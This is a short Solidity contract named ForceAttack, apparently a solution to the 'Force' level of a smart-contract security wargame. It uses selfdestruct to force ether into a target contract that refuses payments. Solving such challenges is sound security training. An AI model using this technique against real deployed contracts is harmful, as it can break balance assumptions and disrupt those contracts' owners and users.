// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '../levels/Force.sol';

contract ForceAttack {

    address payable force;

    constructor(address forceAddress) public payable {
        force = payable(forceAddress);
    }

    function run() public {
        selfdestruct(force);
    }

}
